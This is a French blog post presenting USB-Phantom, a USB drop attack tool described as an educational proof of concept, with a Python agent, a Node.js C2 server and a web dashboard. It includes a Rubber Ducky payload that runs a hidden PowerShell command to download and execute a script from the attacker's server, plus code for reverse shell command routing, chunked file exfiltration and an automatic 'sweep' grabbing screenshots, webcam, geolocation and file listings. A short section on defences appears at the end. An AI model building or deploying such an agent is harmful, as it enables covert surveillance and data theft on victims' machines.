---
title: "USB-Phantom — construire un vecteur d'attaque USB (PoC éducatif)"
description: "USB-Phantom : PoC éducatif d'attaque USB (USB drop attack) — agent Python, serveur C2, reverse shell et exfiltration de fichiers. Code et explications."
date: 2026-08-04 08:00:00 +0200
categories: [Outils, Red Team]
tags: [usb, red-team, c2, reverse-shell, python, nodejs, socket.io, exfiltration, poc, sécurité-offensive]
image:
  path: /assets/img/posts/usb-phantom-cover.png
  alt: USB-Phantom - clé USB attaquante
---

> Après Bandit, Leviathan et le RE101, j'avais envie de construire **mon propre outil**. Pas juste résoudre des challenges : comprendre un vecteur d'attaque réel de bout en bout. J'ai donc développé **USB-Phantom**, un PoC éducatif d'attaque par clé USB (USB drop attack) — un agent Python qui se connecte à un serveur de contrôle (C2), avec dashboard web, reverse shell, exfiltration de fichiers, webcam et géolocalisation. Voici le compte-rendu complet du projet.
{: .prompt-tip }

---

## 🎯 En bref

**USB-Phantom** est un **Proof of Concept** qui simule le scénario suivant : une clé USB branchée sur un PC exécute un agent qui établit une connexion sortante vers un serveur contrôlé par l'attaquant. Depuis un **dashboard web**, l'attaquant peut alors :

1. **Exécuter des commandes** sur la machine cible (reverse shell)
2. **Explorer le système de fichiers** et **télécharger** des documents
3. **Envoyer** des fichiers (payloads) vers la cible
4. **Capturer l'écran** (screenshot) et la **webcam**
5. **Géolocaliser** la cible (IP + GPS si dispo)
6. **Installer une persistance** (démarrage, registre, tâches planifiées)
7. **Déclencher un « SWEEP COMPLET »** : screenshot, webcam, géoloc et fichiers **en même temps**, d'un seul déclenchement

Le tout avec une communication **WebSocket chiffrable** et une interface **dark-mode cyberpunk**.

> ⚠️ **Avertissement** : ce projet est **strictement éducatif**. À utiliser uniquement sur ses propres machines ou dans un cadre de test autorisé (pentest, lab, CTF). L'utilisation sans consentement est illégale.

---

## 🧱 Architecture

```
┌─────────────────────┐         ┌──────────────────────────┐
│  MACHINE CIBLE      │         │  SERVEUR C2 (ATTAQUANT)  │
│                     │         │                          │
│  Agent (Python)     │ ──────► │  Node.js + Socket.IO     │
│  agent.py / .exe    │  ws://  │  Dashboard web (HTML/CSS)│
│                     │         │  Fichiers exfiltrés →    │
│  (clé USB branchée) │         │  server/downloads/       │
└─────────────────────┘         └──────────────────────────┘
```

### Les composants

| Composant | Technologie | Rôle |
|-----------|------------|------|
| **Agent** | Python + websocket-client | S'exécute sur la cible, établit la connexion |
| **Serveur C2** | Node.js + Express + Socket.IO | Point de contrôle central |
| **Dashboard** | HTML/CSS/JS (vanilla) | Interface web de contrôle |
| **Déploiement** | PyInstaller (exe), Docker | Clé USB + container attaquant |

### Le protocole

L'agent et le dashboard parlent en **Socket.IO v4** (WebSocket) :
- L'agent envoie `register-agent` → le serveur le liste dans `agents-update`
- Le dashboard envoie `exec-command` → le serveur route vers l'agent
- L'agent répond `command-output` → le serveur renvoie au dashboard

---

## 🔧 Le développement

### 1. L'agent Python (le cœur)

L'agent est un script Python autonome qui :

```python
# Connexion au serveur C2 (Socket.IO v4 over WebSocket)
ws = websocket.create_connection(
    f"{self.server_url}/socket.io/?EIO=4&transport=websocket",
    timeout=10
)
```

Les points techniques intéressants :

- **Handshake Socket.IO** : le client doit répondre `40` au paquet `0` (open) pour compléter la connexion — sans ça, le serveur ne voit jamais l'agent
- **Ping/Pong Engine.IO** : le serveur envoie `2` (ping) toutes les ~25s, l'agent doit répondre `3` (pong) — sinon il est considéré mort et déconnecté
- **Reconnexion automatique** : l'agent se reconnecte en boucle si la connexion tombe
- **Multi-plateforme** : Windows (PowerShell pour screenshot/webcam), Linux (fswebcam/ffmpeg/OpenCV), macOS (imagesnap)

### 2. Le serveur C2 (Node.js)

Le serveur gère les sessions d'agents et route les commandes du dashboard :

```javascript
// Dashboard demande une commande → on la route vers l'agent
socket.on('exec-command', (data) => {
  const { agentId, command } = data;
  const agent = agents.get(agentId);
  if (agent && agent.socket) {
    agent.socket.emit('run-command', { command, requestId: socket.id });
  }
});
```

### 3. Le dashboard (l'interface)

L'interface dark-mode avec thème cyberpunk violet/bleu, tabs par fonctionnalité :
- **Terminal** : reverse shell temps réel
- **Files** : explorateur avec téléchargement
- **Screenshot / Webcam** : captures à distance
- **Payload** : upload de fichiers vers la cible
- **Geolocation** : carte OpenStreetMap + IP intelligence
- **Persistence** : installation de persistance

---

## 🔄 Le scénario d'attaque complet

### Le vecteur "zéro clic" : la HID attack

Le point crucial : **aucun fichier ne peut se lancer tout seul** sur Windows 10/11 ou Linux moderne (AutoRun est désactivé depuis 2011). Les options réelles :

| Méthode | Zéro clic ? | Matériel | Discrétion |
|---------|------------|----------|------------|
| **HID attack** (Rubber Ducky / Pi Pico) | ✅ Oui | ~7-50€ | ⭐⭐⭐⭐⭐ |
| **LNK déguisé** (raccourci piégé) | ❌ 1 clic | Aucun | ⭐⭐⭐ |
| **autorun.inf** | ❌ Bloqué | Aucun | ❌ |

Le **Pi Pico à ~7€** flashé avec le firmware Pico-Ducky se fait passer pour un **clavier** et tape les commandes toutes seules :

```text
GUI r                                    # Ouvre "Exécuter"
STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://IP:8080/payload.ps1')"
ENTER
```

En ~15 secondes, l'agent est téléchargé et lancé **sans aucune interaction** de la victime, sans aucune fenêtre visible.

### Le flux complet

```
1. La clé HID est branchée
2. Elle tape les commandes (PowerShell silencieux)
3. L'agent est téléchargé depuis le serveur C2
4. L'agent se lance en arrière-plan (aucune fenêtre)
5. L'agent se connecte au C2 (connexion sortante)
6. La victime apparaît dans le dashboard
7. L'attaquant contrôle, explore, exfiltre
```

### L'exfiltration de fichiers

```python
# L'agent lit le fichier et l'envoie en chunks base64
with open(p, 'rb') as f:
    while True:
        chunk = f.read(65536)
        if not chunk:
            break
        self.send('file-chunk', {
            'requestId': request_id,
            'fileName': file_name,
            'chunk': base64.b64encode(chunk).decode(),
            'isLast': f.tell() >= file_size
        })
```

Le serveur reçoit les chunks et les assemble dans `server/downloads/`.

### ⚡ Le mode SWEEP COMPLET : un clic = tout

La grande évolution du projet : **un seul déclenchement lance TOUTES les actions en même temps**. Fini les actions une par une depuis le dashboard — dès que la victime clique sur le leurre de la clé, l'agent exécute en parallèle :

| Action | Déclenchée automatiquement |
|--------|---------------------------|
| 📸 **Screenshot** | ✅ |
| 📹 **Webcam** | ✅ |
| 📍 **Géolocalisation** (IP + GPS) | ✅ |
| 📁 Fichiers `home` | ✅ |
| 📁 Fichiers `Documents` | ✅ |
| 📁 Fichiers `Downloads` | ✅ |
| 📁 Fichiers `Desktop` | ✅ |

Côté implémentation, tout repose sur des **threads parallèles** : chaque action est lancée dans son propre thread, puis les résultats sont renvoyés **groupés en un seul message** `sweep-results` :

```python
def run_sweep(self):
    """⚡ SWEEP COMPLET : exécute TOUTES les actions en même temps."""
    if self.sweep_running:  # garde-fou anti-doublons
        return
    self.sweep_running = True
    self.send('sweep-started', {'agentId': self.agent_id, 'hostname': self.hostname})

    results, errors = {}, {}

    def safe(fn, key):
        try:
            results[key] = fn()
        except Exception as e:
            errors[key] = str(e)

    threads = []
    threads.append(threading.Thread(target=safe, args=(
        lambda: self._capture_screenshot_base64(), 'screenshot'), daemon=True))
    threads.append(threading.Thread(target=safe, args=(
        lambda: self._capture_webcam(), 'webcam'), daemon=True))
    threads.append(threading.Thread(target=safe, args=(
        lambda: self._collect_geolocation(), 'geolocation'), daemon=True))
    for label, folder in [('home', '~'), ('documents', '~/Documents'),
                          ('downloads', '~/Downloads'), ('desktop', '~/Desktop')]:
        threads.append(threading.Thread(target=safe, args=(
            lambda f=folder: self._list_files_simple(f), label), daemon=True))

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=25)

    self.send('sweep-results', {
        'agentId': self.agent_id, 'hostname': self.hostname,
        'username': self.username, 'platform': self.platform,
        'results': results, 'errors': errors
    })
```

Le déclenchement se fait de **deux façons** :

1. **Automatique** : le script `prepare_usb_key.sh` configure l'agent avec `AUTO_SWEEP = True`. Dès que la victime clique sur le leurre, tout part **sans que l'attaquant touche au dashboard**.
2. **Manuel** : un bouton **⚡ SWEEP COMPLET** (violet lumineux animé) en haut du dashboard déclenche la même chose en un clic sur l'agent de ton choix.

> 💡 Résultat de test réel : **géolocalisation IP (lat 6.36, lon 2.41)**, 94 fichiers dans `home`, 10 documents — le tout reçu **groupé en un seul message**, 7 actions en parallèle, en ~2 secondes.
{: .prompt-info }

---

## 🧪 Les tests réalisés

J'ai testé le projet **de bout en bout sur ma machine** avec le serveur dans un container Docker (l'attaquant) et l'agent sur l'hôte (la victime) :

```bash
# 1. Lancer le serveur attaquant dans Docker
./start_attacker.sh start

# 2. Lancer l'agent (la "victime" - mon PC)
cd client && python3 agent.py

# 3. Depuis le dashboard (http://localhost:8080)
# → L'agent apparaît : "Agent registered: kali"
```

Résultats des tests :

| Test | Résultat |
|------|----------|
| Shell distant (`whoami && hostname`) | ✅ `emma_aura` / `kali` |
| Explorateur de fichiers (`~`) | ✅ 94 entrées listées |
| Téléchargement de fichier | ✅ `README.md` (5346 octets) → `downloads/` |
| Exfiltration d'un fichier "secret" | ✅ `test_secret.txt` (1020 octets) |
| Contrôle via le leurre USB simulé | ✅ Launcher → agent → C2 → commande |
| **SWEEP COMPLET automatique** (clic sur le leurre) | ✅ 7 actions en parallèle, groupées en un seul message |
| **SWEEP COMPLET manuel** (bouton ⚡ dashboard) | ✅ Même résultat |

Le test le plus satisfaisant : lancer l'agent via le **leurre USB** (le fichier `ouvrir.sh` du dossier piégé), ne **rien voir à l'écran** (aucune fenêtre), et constater 2 secondes plus tard que l'agent est en ligne dans le dashboard. C'est exactement le comportement d'un vrai USB drop attack.

---

## 🐳 Docker comme "PC attaquant"

Pour un test propre et reproductible, j'ai containerisé le serveur C2 :

```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package.json ./
RUN npm install --omit=dev
COPY server.js ./
COPY public ./public
RUN mkdir -p /app/downloads
EXPOSE 8080
CMD ["node", "server.js"]
```

```yaml
# docker-compose.yml
services:
  c2-server:
    build: ./server
    container_name: usb-phantom-c2
    ports:
      - "8080:8080"
    volumes:
      - ./server/downloads:/app/downloads
```

Avantages : le serveur est isolé, reproductible (`docker compose up -d`), et les fichiers exfiltrés arrivent **directement sur l'hôte** via le volume monté.

---

## 🛡️ Ce que ça m'a appris (défense aussi)

Un projet offensif apprend énormément sur la **défense**. Les mesures qui bloquent ce vecteur :

| Mesure défensive | Contre quoi |
|-----------------|-------------|
| **Désactiver AutoRun** | déjà fait par défaut sur Windows 10/11 |
| **Contrôle de périphériques USB** (allowlist) | bloque les claviers HID inconnus |
| **AppLocker / WDAC** | bloque les exe non signés |
| **EDR/AV** | détecte les comportements suspects (connexion sortante + PowerShell) |
| **Segmentation réseau** | limite ce qu'un agent peut atteindre |
| **Journalisation** | les connexions sortantes anormales sont visibles |

> **La meilleure défense reste l'humain** : ne jamais brancher une clé USB inconnue, ne jamais cliquer sur des fichiers trouvés sur une clé. C'est le vecteur n°1 des attaques physiques.

---

## 📚 Ressources liées

- [Le projet USB-Phantom (code source)](https://github.com/emma-aura/usb-phantom) — tout le code, les scripts, les guides *(dépôt à publier — à remplacer par ton lien GitHub si besoin)*
- [Hak5 — USB Rubber Ducky](https://shop.hak5.org) — la clé HID commerciale
- [dbisu/pico-ducky](https://github.com/dbisu/pico-ducky) — firmware Pi Pico → Ducky
- [MITRE ATT&CK — USB drop (T1200)](https://attack.mitre.org/techniques/T1200/) — la technique référencée
- [Ma page Ressources]({% link _tabs/ressources.md %}) — où j'ai ajouté les liens red team
- [Mon récap OverTheWire]({% post_url 2026-08-03-overthewire-wargames-recapitulatif %}) — le contexte de ma progression

*Prochaine étape : RE102 pour approfondir l'analyse de malware, et peut-être un vrai Pi Pico pour tester la HID attack en conditions réelles. Stay tuned !* 🚀
